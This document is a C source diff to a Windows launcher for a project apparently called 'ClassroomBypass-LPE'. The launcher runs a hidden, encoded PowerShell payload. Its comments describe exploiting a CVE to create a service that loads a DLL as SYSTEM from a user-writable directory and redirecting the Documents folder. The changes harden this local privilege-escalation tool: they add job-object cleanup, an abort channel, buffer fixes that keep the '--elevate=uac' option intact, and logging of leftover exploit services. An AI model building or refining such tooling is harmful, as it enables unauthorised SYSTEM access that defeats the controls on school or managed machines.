@@ -41,6 +41,13 @@
    a decode error instead of the real reason). */
 #define LPE_CMDLINE_MAX  32767
 
+/* How long the launcher waits for trigger.ps1 to unwind through its finally
+   after the user hits "skip".  Fixed on purpose: the user gave up, so this must
+   not scale with TimeoutSec (45 s).  The loop polls the abort file every
+   200 ms, and the only thing the finally does is one documents_path.exe set,
+   so 3000 ms is ~15 polls of slack for a script that is not stuck. */
+#define LPE_SKIP_GRACE_MS 3000
+
 static int   g_mode = -1;
 
 /* ---------------- small helpers ---------------- */
@@ -226,12 +233,14 @@ static int CmdLineMode(const char* cmdline, int* found)
 
 /* ---------------- launching helpers ---------------- */
 
-static int RunHidden(char* cmdline, const char* logPath, HANDLE* outProc)
+static int RunHidden(char* cmdline, const char* logPath, HANDLE* outProc,
+                     HANDLE job)
 {
     STARTUPINFOA        si;
     PROCESS_INFORMATION pi;
     SECURITY_ATTRIBUTES sa;
     HANDLE hOut = INVALID_HANDLE_VALUE, hNul = INVALID_HANDLE_VALUE;
+    DWORD  flags;
 
     memset(&sa, 0, sizeof(sa));
     sa.nLength = sizeof(sa);
@@ -262,8 +271,13 @@ static int RunHidden(char* cmdline, const char* logPath, HANDLE* outProc)
     }
     memset(&pi, 0, sizeof(pi));
 
+    /* CREATE_SUSPENDED closes the window between CreateProcess returning and
+       AssignProcessToJobObject succeeding: without it the child may already
+       have spawned a grandchild that then lives outside the job.  It costs one
+       ResumeThread below and nothing else. */
+    flags = CREATE_NO_WINDOW | (job ? CREATE_SUSPENDED : 0);
     if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
-                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                        flags, NULL, NULL, &si, &pi)) {
         ELog("CreateProcess failed err=%lu", (unsigned long)GetLastError());
         if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
         if (hNul != INVALID_HANDLE_VALUE) CloseHandle(hNul);
@@ -271,10 +285,179 @@ static int RunHidden(char* cmdline, const char* logPath, HANDLE* outProc)
     }
     if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
     if (hNul != INVALID_HANDLE_VALUE) CloseHandle(hNul);
+
+    if (job) {
+        if (AssignProcessToJobObject(job, pi.hProcess)) {
+            ELog("lpe: script is in the job (kill-on-close)");
+        } else {
+            /* Not fatal.  The usual reason is that the child already belongs
+               to a job we do not control (ERROR_ACCESS_DENIED); a hard kill by
+               handle still stops the script itself, only its own children
+               escape.  Documents has two backstops for that: the finally block
+               while the script lives, the snapshot after it dies. */
+            ELog("lpe: job assign failed err=%lu - a hard kill will cover the "
+                 "script only, not its children", (unsigned long)GetLastError());
+        }
+        /* Unconditional and after the assign: a child left suspended because
+           "the protection failed" looks exactly like a hung tool to the user,
+           which is strictly worse than running it unprotected. */
+        ResumeThread(pi.hThread);
+    }
+
     CloseHandle(pi.hThread);
     if (outProc) *outProc = pi.hProcess;
     else         CloseHandle(pi.hProcess);
     return 1;
+}
+
+/* ---------------- skip channel + job object ---------------- */
+
+/* %LOCALAPPDATA%\ClassroomBypass-LPE\abort.<pid>
+   Same directory as the Documents snapshot, for the same reason: bin\lpe can
+   be read-only (a copy under Program Files), and this file has to be writable
+   by a Medium-IL process.  The pid in the name keeps a file left by an earlier
+   run from cancelling this one - except when Windows reuses the pid, which is
+   why the file is also deleted before the script starts. */
+static int SkipFilePath(char* out, size_t n, DWORD pid)
+{
+    char  base[MAX_PATH];
+    char  dir[MAX_PATH];
+    DWORD got;
+    int   r;
+
+    if (!out || n == 0) return 0;
+    out[0] = '\0';
+
+    got = GetEnvironmentVariableA("LOCALAPPDATA", base, sizeof(base));
+    if (got == 0 || (size_t)got >= sizeof(base)) return 0;
+
+    r = _snprintf(dir, sizeof(dir), "%s\\ClassroomBypass-LPE", base);
+    if (r < 0 || (size_t)r >= sizeof(dir)) return 0;
+    CreateDirectoryA(dir, NULL);        /* already existing is the normal case */
+
+    r = _snprintf(out, n, "%s\\abort.%lu", dir, (unsigned long)pid);
+    if (r < 0 || (size_t)r >= n) { out[0] = '\0'; return 0; }
+    return 1;
+}
+
+/* The file's existence is the signal; the text inside is for the log's sake
+   only (a human reading %LOCALAPPDATA% can tell when the skip happened). */
+static int WriteAbort(const char* path)
+{
+    HANDLE h;
+    char   line[64];
+    int    n;
+    DWORD  written = 0;
+
+    h = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                    NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) {
+        ELog("lpe: cannot write the abort file %s (err=%lu)", path,
+             (unsigned long)GetLastError());
+        return 0;
+    }
+    n = _snprintf(line, sizeof(line), "abort %lu\r\n",
+                  (unsigned long)GetTickCount());
+    if (n > 0) WriteFile(h, line, (DWORD)n, &written, NULL);
+    CloseHandle(h);
+    return 1;
+}
+
+/* A kill between CreateServiceW and DeleteService leaves CVE49176_<pid>_<tick>
+   behind.  It cannot start by itself (SERVICE_DEMAND_START, default DACL gives
+   Interactive User query-only), but the next High-IL context can start it, and
+   it would load wallet_callback_shell.dll from a user-writable directory as
+   SYSTEM - so a leftover deserves a line in the log, not just a README note.
+   Enumeration needs only SC_MANAGER_ENUMERATE_SERVICE.  Nothing is deleted
+   here: that needs admin, and "skip" must not turn into a second UAC prompt. */
+static void LogLeftoverServices(void)
+{
+    SC_HANDLE             scm;
+    LPENUM_SERVICE_STATUSA buf;
+    DWORD                 size = 16 * 1024;
+    DWORD                 needed = 0, returned = 0, resume = 0;
+    int                   found = 0;
+
+    scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
+    if (!scm) {
+        ELog("note: cannot enumerate services (err=%lu) - check CVE49176_* by "
+             "hand if this machine ever skipped mid-flight",
+             (unsigned long)GetLastError());
+        return;
+    }
+
+    for (;;) {
+        DWORD i;
+        DWORD err;
+
+        buf = (LPENUM_SERVICE_STATUSA)malloc(size);
+        if (!buf) break;
+        if (!EnumServicesStatusA(scm, SERVICE_WIN32, SERVICE_STATE_ALL,
+                                 buf, size, &needed, &returned, &resume)) {
+            err = GetLastError();
+            free(buf);
+            if (err == ERROR_MORE_DATA && needed > size) { size = needed; continue; }
+            break;
+        }
+        for (i = 0; i < returned; i++) {
+            if (_strnicmp(buf[i].lpServiceName, "CVE49176_", 9) != 0) continue;
+            if (found < 5)
+                ELog("note: service %s may remain - see lpe\\README.md for the "
+                     "elevated cleanup sequence", buf[i].lpServiceName);
+            found++;
+        }
+        free(buf);
+        if (resume == 0) break;
+    }
+    CloseServiceHandle(scm);
+
+    if (found == 0)  ELog("note: no leftover CVE49176_* service");
+    else if (found > 5) ELog("note: %d CVE49176_* services in total", found);
+}
+
+/* KILL_ON_JOB_CLOSE is the backstop for "elevate.c vanished": closing the last
+   handle to the job terminates everything inside it, so a killed launcher
+   cannot leave a hidden powershell holding the Documents redirect. */
+static HANDLE CreateKillOnCloseJob(void)
+{
+    HANDLE job;
+    JOBOBJECT_EXTENDED_LIMIT_INFORMATION li;
+
+    job = CreateJobObjectW(NULL, NULL);
+    if (!job) {
+        ELog("lpe: CreateJobObject failed err=%lu", (unsigned long)GetLastError());
+        return NULL;
+    }
+    memset(&li, 0, sizeof(li));
+    li.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
+    if (!SetInformationJobObject(job, JobObjectExtendedLimitInformation,
+                                 &li, sizeof(li))) {
+        ELog("lpe: SetInformationJobObject failed err=%lu",
+             (unsigned long)GetLastError());
+        CloseHandle(job);
+        return NULL;
+    }
+    return job;
+}
+
+/* Closing the handle kills the script, so every NORMAL return has to disarm
+   first.  The success path in particular breaks out of the loop as soon as the
+   handshake appears, while trigger.ps1 is usually still inside its finally -
+   killing it there would leave Documents on the LPE root on every successful
+   run, which is far worse than the skip case this job was added for.
+   Explicit kills are TerminateProcess calls; this job only answers "what if
+   the launcher dies?". */
+static void CloseJob(HANDLE job)
+{
+    JOBOBJECT_EXTENDED_LIMIT_INFORMATION li;
+
+    if (!job) return;
+    memset(&li, 0, sizeof(li));
+    if (!SetInformationJobObject(job, JobObjectExtendedLimitInformation,
+                                 &li, sizeof(li)))
+        ELog("lpe: could not disarm kill-on-close err=%lu - closing the handle "
+             "may kill the script", (unsigned long)GetLastError());
+    CloseHandle(job);
 }
 
 /* 32-bit build on 64-bit Windows: System32 is redirected to SysWOW64, so the
@@ -633,17 +816,22 @@ static void PsQuote(char* out, size_t n, const char* s)
 }
 
 static char* BuildEncodedCommand(const char* scriptPath, const char* repo,
-                                 const char* target)
+                                 const char* target, DWORD abortPid)
 {
     FILE*    f;
     char*    script;
     char*    all;
     char*    b64 = NULL;
     wchar_t* wide = NULL;
-    char     pre[1500];
-    char     qRepo[700], qTarget[900];
+    char     qRepo[700];
+    /* 2 * 2048 + 8: both call sites keep target in a char[2048] and refuse to
+       truncate it, and PowerShell quoting can at most double every byte.  The
+       old 900-byte buffer silently cut the tail of a long command line, and the
+       tail is where "--elevate=uac" lives. */
+    char     qTarget[2 * 2048 + 8];
+    char     pre[sizeof(qRepo) + sizeof(qTarget) + 96];
     long     size;
-    int      wlen;
+    int      wlen, npre;
 
     f = fopen(scriptPath, "rb");
     if (!f) return NULL;
@@ -664,10 +852,19 @@ static char* BuildEncodedCommand(const char* scriptPath, const char* repo,
 
     PsQuote(qRepo, sizeof(qRepo), repo);
     PsQuote(qTarget, sizeof(qTarget), target);
-    _snprintf(pre, sizeof(pre) - 1,
-              "$Repo=%s;$TargetCommand=%s;$TimeoutSec=45;\r\n",
-              qRepo, qTarget);
+    /* AbortPid is the pid of THIS launcher: trigger.ps1 is our direct child, so
+       it cannot derive it from $PID (that is powershell's own pid) and should
+       not have to walk the WMI parent chain for one number. */
+    npre = _snprintf(pre, sizeof(pre) - 1,
+                     "$Repo=%s;$TargetCommand=%s;$TimeoutSec=45;$AbortPid=%lu;\r\n",
+                     qRepo, qTarget, (unsigned long)abortPid);
     pre[sizeof(pre) - 1] = '\0';
+    if (npre < 0 || npre >= (int)sizeof(pre) - 1) {
+        ELog("lpe: encoded preamble does not fit (%d bytes, max %u)",
+             npre, (unsigned)sizeof(pre) - 2);
+        free(script);
+        return NULL;
+    }
 
     all = (char*)malloc(strlen(pre) + strlen(script) + 1);
     if (all) {
@@ -704,8 +901,9 @@ static int TryLpe(const char* cmdline)
        nothing else in this process touches these buffers. */
     static char cmd[LPE_CMDLINE_MAX], target[2048];
     char    exe[MAX_PATH];
-    HANDLE  proc = NULL;
-    DWORD   t0, lastBeat, exitCode = 0, pid = 0, exitTick = 0, got;
+    char    abortPath[MAX_PATH];
+    HANDLE  proc = NULL, job = NULL;
+    DWORD   t0, lastBeat, exitCode = 0, pid = 0, exitTick = 0, got, skipTick = 0;
     int     ok = 0, skipped = 0, i, n, stillRunning = 0;
 
     if (!ExeDir(dir, sizeof(dir))) return 0;
@@ -765,7 +963,7 @@ static int TryLpe(const char* cmdline)
         char* enc;
 
         if (!Join(repo, sizeof(repo), dir, "lpe")) return 0;
-        enc = BuildEncodedCommand(script, repo, target);
+        enc = BuildEncodedCommand(script, repo, target, GetCurrentProcessId());
         if (!enc) {
             ELog("lpe: cannot read/encode %s", script);
             return 0;
@@ -786,7 +984,19 @@ static int TryLpe(const char* cmdline)
     }
 
     ELog("lpe: payload %s (encoded command)", script);
-    if (!RunHidden(cmd, hookLog, &proc)) return 0;
+
+    /* Both prepared before the script starts: the abort file so that a stale
+       one (same pid, earlier run) cannot read as "the user already skipped",
+       and the job so the script is inside it before it can spawn anything. */
+    if (!SkipFilePath(abortPath, sizeof(abortPath), GetCurrentProcessId()))
+        abortPath[0] = '\0';
+    if (abortPath[0]) DeleteFileA(abortPath);
+    job = CreateKillOnCloseJob();
+
+    if (!RunHidden(cmd, hookLog, &proc, job)) {
+        if (job) CloseHandle(job);      /* empty job: nothing to disarm */
+        return 0;
+    }
 
     StatusSetText("正在自动提权…\r\n"
                   "钱包服务链路已经启动，正常需要 10~30 秒。\r\n"
@@ -796,7 +1006,41 @@ static int TryLpe(const char* cmdline)
     for (;;) {
         int sr;
 
-        if (g_swSkip) { skipped = 1; break; }
+        if (g_swSkip && !skipped) {
+            skipped = 1;
+            skipTick = GetTickCount();
+            if (abortPath[0] && WriteAbort(abortPath)) {
+                ELog("lpe: user skipped, abort written, waiting up to %d ms for "
+                     "trigger.ps1", LPE_SKIP_GRACE_MS);
+            } else {
+                ELog("lpe: user skipped, no abort file (%s) - waiting up to %d ms "
+                     "anyway", abortPath[0] ? abortPath : "LOCALAPPDATA is not set",
+                     LPE_SKIP_GRACE_MS);
+            }
+            LogLeftoverServices();
+            StatusSetText("正在取消自动提权…\r\n"
+                          "等脚本把 Documents 还原，最多 3 秒。");
+        }
+
+        if (skipped) {
+            /* Semantics B: the script is the one that restores Documents, so
+               wait for it to unwind through its finally instead of killing it
+               on the spot.  Only a script that does not react gets killed. */
+            if (WaitForSingleObject(proc, 0) != WAIT_TIMEOUT) {
+                ELog("lpe: trigger.ps1 exited after %lu ms",
+                     (unsigned long)(GetTickCount() - skipTick));
+                break;
+            }
+            if (GetTickCount() - skipTick > LPE_SKIP_GRACE_MS) {
+                ELog("lpe: trigger.ps1 did not exit in %d ms, terminating",
+                     LPE_SKIP_GRACE_MS);
+                TerminateProcess(proc, 1);
+                WaitForSingleObject(proc, 1000);
+                break;
+            }
+            Sleep(100);
+            continue;
+        }
 
         sr = ScanHookLogStatus(hookLog, &pid);
         if (sr == 2) {                  /* the child gave up: no admin coming */
@@ -852,16 +1096,25 @@ static int TryLpe(const char* cmdline)
     }
 
     if (proc) {
-        GetExitCodeProcess(proc, &exitCode);
-        if (!ok) {
-            /* The finally block cannot restore Documents if we kill the script
-               mid-flight, so only do it when it is clearly not going to end. */
-            if (skipped || (exitCode == STILL_ACTIVE &&
-                            GetTickCount() - t0 > 55000))
-                TerminateProcess(proc, 1);
+        DWORD code;
+
+        if (GetExitCodeProcess(proc, &code)) exitCode = code;
+        /* The skip path already waited (and terminated if it had to).  A script
+           still running 55 s in is not going to produce an admin instance, so
+           stop it - the finally has had every chance by then. */
+        if (!ok && !skipped && exitCode == STILL_ACTIVE &&
+            GetTickCount() - t0 > 55000) {
+            ELog("lpe: script still running after %lu s, terminating",
+                 (unsigned long)((GetTickCount() - t0) / 1000));
+            TerminateProcess(proc, 1);
         }
         CloseHandle(proc);
     }
+    CloseJob(job);
+
+    /* The writer is also the only deleter (trigger.ps1 never removes it), and
+       the pid-named file would otherwise sit in %LOCALAPPDATA% forever. */
+    if (abortPath[0]) DeleteFileA(abortPath);
 
     if (ok) {
         ELog("lpe: elevated instance pid=%lu is running", (unsigned long)pid);
@@ -940,7 +1193,7 @@ int Elevate_Boot(HWND owner, const char* cmdline, int silent)
             GetModuleFileNameA(NULL, exe, sizeof(exe));
             _snprintf(target, sizeof(target) - 1, "\"%s\"", exe);
             target[sizeof(target) - 1] = '\0';
-            enc = BuildEncodedCommand(script, repo, target);
+            enc = BuildEncodedCommand(script, repo, target, GetCurrentProcessId());
         }
         if (!enc) {
             ELog("selftest: cannot read/encode %s", script);
